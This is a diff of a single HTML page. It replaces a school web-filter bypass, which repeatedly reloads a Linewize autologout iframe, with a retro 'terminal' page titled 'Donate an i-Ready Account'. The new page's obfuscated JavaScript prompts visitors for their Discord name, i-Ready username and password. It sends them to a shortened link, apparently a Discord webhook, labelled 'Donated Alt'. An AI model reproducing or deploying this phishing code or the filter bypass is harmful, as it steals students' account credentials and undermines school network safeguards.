@@ -1,45 +1,94 @@
 <!DOCTYPE html>
-<html>
-  <head>
-    <title>SineWize</title>
-    <link rel="icon" href="icon.png" type="image/png">
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Old School Terminal</title>
     <style>
-      @import url("https://fonts.googleapis.com/css?family=Source+Sans+Pro:300, 400");
-      @import url("https://fonts.googleapis.com/icon?family=Material+Icons");
-      iframe {
-        position:absolute;
-        top:-150px;
-        border:none;
-      }
-      body {
-        background-color: #935d8c;
-        background-image: url(https://optifinesource.co.uk/assets/img/overlay.png), linear-gradient(45deg, #e37682 15%, #5f4d93 85%);
-        font-weight: 300;
-        background-attachment: fixed;
-      }
-      html,*{
-        color: white;
-        border-color: white;
-        background-color:rgba(0,0,0,0);
-        transition: .3s ease-out;
-        outline:none;
-      }
-      div {
-        border: 1px solid white;
-        border-radius:10px;
-      }
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: "Courier New", monospace;
+            background-image: url("https://content.invisioncic.com/r322239/post-3107-1167627893.jpg");
+            background-size: cover;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+            background-color: black;
+            color: LightGreen;
+            overflow: hidden;
+        }
+
+        .window {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 600px;
+            height: 400px;
+            background-color: #000;
+            border: 2px solid #00ff00;
+            border-radius: 5px;
+            overflow: hidden;
+        }
+
+        .title-bar {
+            display: flex;
+            align-items: center;
+            height: 30px;
+            background-color: #00ff00;
+            user-select: none;
+        }
+
+        .title {
+            flex: 1;
+            padding-left: 10px;
+            color: #000;
+        }
+
+        .title-bar-btns {
+            display: flex;
+            gap: 5px;
+            margin-right: 5px;
+        }
+
+        .title-btn {
+            width: 10px;
+            height: 10px;
+            border-radius: 50%;
+            background-color: white;
+        }
+
+        .content {
+            padding: 10px;
+            overflow: auto;
+            height: 85%;
+        }
+
+        input[type="text"] {
+            background-color: transparent;
+            border: none;
+            color: LightGreen;
+            font-family: inherit;
+            padding: 3px;
+            width: 100%;
+            outline: none;
+        }
     </style>
-  </head>
-  <body>
-    <iframe id="iframe" src="https://autologout.linewize.net/"></iframe>
-    <h1>This Is SineWize Home Page!</h1>
-    <p>Keep me open for unblock</p>
-  </body>
-  <script type="text/javascript">
-    function test() {
-      document.getElementById('iframe').src="https://autologout.linewize.net/?"+new Date().getTime();
-      setTimeout(function(){test()},2000);
-    }
-    test();
-  </script>
+</head>
+<body>
+    <div class="window">
+        <div class="title-bar">
+            <div class="title">Donate an i-Ready Account</div>
+            <span class="title-bar-btns">
+                <span class="title-btn"></span>
+                <span class="title-btn"></span>
+                <span class="title-btn"></span>
+            </span>
+        </div>
+        <div class="content"></div>
+    </div>
+    <script>
+ const _0x1488f1=_0x19cc;function _0x2dbc(){const _0x19bc8d=['focus','addEventListener','i-Ready\x20username','includes','error','Oh\x20ok\x20then\x20😔','key','Would\x20you\x20like\x20to\x20start?\x20(yes/no)','type','6954492GQMCtH','385956EVnbuf','input','keydown','1571446eWJclN','Avoid\x20Bans','text','catch','stringify','appendChild','trim','.content','POST','10443PMxwMn','What\x20is\x20your\x20Discord\x20username?','180xifPtA','toISOString','Uncaught\x20Syntax\x20Error\x20[not\x20valid\x20response\x20(','Yes','innerHTML','value','Discord\x20username','Error\x20sending\x20information\x20to\x20Discord:\x20','Discord\x20Username','1397945xMbRHV','application/json','createElement','Thank\x20you\x20for\x20donating!\x20Your\x20roles\x20will\x20be\x20added\x20shortly.\x0aWould\x20you\x20like\x20to\x20donate\x20again?\x20(yes/no)','Password','removeEventListener','password','yes','By\x20donating\x20your\x20account,\x20you\x20may\x20be\x20subject\x20to\x20account\x20banning.\x0aIf\x20you\x20want\x20us\x20to\x20specifically\x20avoid\x20suspending\x20your\x20account,\x20say\x20\x27yes\x27.\x20If\x20not,\x20say\x20\x27no\x27.','184mbqQop','What\x20is\x20your\x20i-Ready\x20username?','1OUsIsB','24860snByPY','textContent','https://tinyurl.com/28pjfd2t','querySelector','color','Enter','preventDefault','2020HOegKR','327257VKGBph'];_0x2dbc=function(){return _0x19bc8d;};return _0x2dbc();}function _0x19cc(_0x4d835f,_0x213c91){const _0x2dbc12=_0x2dbc();return _0x19cc=function(_0x19cc09,_0x45e655){_0x19cc09=_0x19cc09-0x110;let _0x3a390a=_0x2dbc12[_0x19cc09];return _0x3a390a;},_0x19cc(_0x4d835f,_0x213c91);}(function(_0x263504,_0x62f1b1){const _0x4e7cf1=_0x19cc,_0x5eeffd=_0x263504();while(!![]){try{const _0x5e1789=parseInt(_0x4e7cf1(0x144))/0x1*(-parseInt(_0x4e7cf1(0x125))/0x2)+parseInt(_0x4e7cf1(0x12e))/0x3*(-parseInt(_0x4e7cf1(0x130))/0x4)+-parseInt(_0x4e7cf1(0x139))/0x5+parseInt(_0x4e7cf1(0x121))/0x6+-parseInt(_0x4e7cf1(0x117))/0x7*(-parseInt(_0x4e7cf1(0x142))/0x8)+parseInt(_0x4e7cf1(0x122))/0x9+-parseInt(_0x4e7cf1(0x116))/0xa*(parseInt(_0x4e7cf1(0x145))/0xb);if(_0x5e1789===_0x62f1b1)break;else _0x5eeffd['push'](_0x5eeffd['shift']());}catch(_0x3832c2){_0x5eeffd['push'](_0x5eeffd['shift']());}}}(_0x2dbc,0x922ea),document[_0x1488f1(0x119)]('DOMContentLoaded',function(){const _0x5aca90=_0x1488f1,_0x1fc294=document[_0x5aca90(0x112)](_0x5aca90(0x12c));let _0x2887ea=0x0;function _0x48c725(_0x552d8e,_0x2238b6=![]){const _0x3050a8=_0x5aca90,_0x31a487=document[_0x3050a8(0x13b)]('div');_0x31a487[_0x3050a8(0x110)]=_0x552d8e,_0x2238b6&&(_0x31a487['style'][_0x3050a8(0x113)]='red'),_0x1fc294[_0x3050a8(0x12a)](_0x31a487);}function _0x2a1989(_0x1b9567,_0x348aeb){const _0x7376e0=_0x5aca90;_0x48c725(_0x1b9567);const _0x3a84a3=document[_0x7376e0(0x13b)](_0x7376e0(0x123));_0x3a84a3[_0x7376e0(0x120)]=_0x7376e0(0x127),_0x3a84a3[_0x7376e0(0x135)]='',_0x1fc294[_0x7376e0(0x12a)](_0x3a84a3),_0x3a84a3[_0x7376e0(0x118)]();function _0x11faf7(_0x3e7ef6){const _0xaf3f41=_0x7376e0;if(_0x3e7ef6[_0xaf3f41(0x11e)]===_0xaf3f41(0x114)){_0x3e7ef6[_0xaf3f41(0x115)]();const _0x206abf=_0x3a84a3[_0xaf3f41(0x135)][_0xaf3f41(0x12b)]();_0x1fc294['removeChild'](_0x3a84a3),document[_0xaf3f41(0x13e)](_0xaf3f41(0x124),_0x11faf7);if(_0x1b9567[_0xaf3f41(0x11b)](_0xaf3f41(0x11a))||_0x1b9567[_0xaf3f41(0x11b)](_0xaf3f41(0x13f))||_0x1b9567[_0xaf3f41(0x11b)](_0xaf3f41(0x136)))_0x348aeb(_0x206abf);else _0x206abf==='yes'||_0x206abf==='no'?_0x348aeb(_0x206abf):(_0x48c725(_0xaf3f41(0x132)+_0x206abf+')\x20]',!![]),_0x2a1989(_0x1b9567,_0x348aeb));}}document[_0x7376e0(0x119)](_0x7376e0(0x124),_0x11faf7);}function _0x54af3a(_0x48f78d){const _0x27d513=_0x5aca90,_0x25c9ad=_0x27d513(0x111),_0x54dcfe={'embeds':[{'title':'**Donated\x20Alt**','description':'','color':0x9933ff,'fields':[{'name':_0x27d513(0x138),'value':_0x48f78d['discordUsername'],'inline':!![]},{'name':'i-Ready\x20Username','value':_0x48f78d['username'],'inline':!![]},{'name':_0x27d513(0x13d),'value':'||'+_0x48f78d[_0x27d513(0x13f)]+'||','inline':!![]},{'name':_0x27d513(0x126),'value':_0x48f78d['banResponse']===_0x27d513(0x140)?_0x27d513(0x133):'No','inline':!![]}],'footer':{'text':'Powered\x20by\x20Neo\x20Engine'},'timestamp':new Date()[_0x27d513(0x131)]()}]};fetch(_0x25c9ad,{'method':_0x27d513(0x12d),'headers':{'Content-Type':_0x27d513(0x13a)},'body':JSON[_0x27d513(0x129)](_0x54dcfe)})[_0x27d513(0x128)](_0x4703a2=>{const _0xd12115=_0x27d513;console[_0xd12115(0x11c)](_0xd12115(0x137)+_0x4703a2);});}function _0x158c83(){const _0x38024c=_0x5aca90;_0x2887ea===0x0&&_0x2a1989(_0x38024c(0x11f),function(_0x3f60e0){const _0x2e1e65=_0x38024c;if(_0x3f60e0==='no')_0x48c725('If\x20you\x20ain\x27t\x20gonna\x20run\x20me,\x20tf\x20you\x20doing\x20on\x20my\x20website\x20💀💀');else _0x3f60e0==='yes'&&_0x2a1989(_0x2e1e65(0x12f),function(_0x4de167){const _0x4f85e0=_0x2e1e65;_0x2a1989(_0x4f85e0(0x143),function(_0x19cf19){_0x2a1989('What\x20is\x20your\x20password?',function(_0x971988){const _0x5b2f84=_0x19cc;_0x2a1989(_0x5b2f84(0x141),function(_0x7d785c){const _0x56c1ac=_0x5b2f84;_0x54af3a({'discordUsername':_0x4de167,'username':_0x19cf19,'password':_0x971988,'banResponse':_0x7d785c}),_0x2a1989(_0x56c1ac(0x13c),function(_0x5ae7e6){const _0x1c09f6=_0x56c1ac;if(_0x5ae7e6==='no')_0x48c725(_0x1c09f6(0x11d));else _0x5ae7e6===_0x1c09f6(0x140)&&(_0x1fc294[_0x1c09f6(0x134)]='',_0x2887ea=0x0,_0x158c83());});});});});});});}_0x158c83();}));
+    </script>
+</body>
 </html>
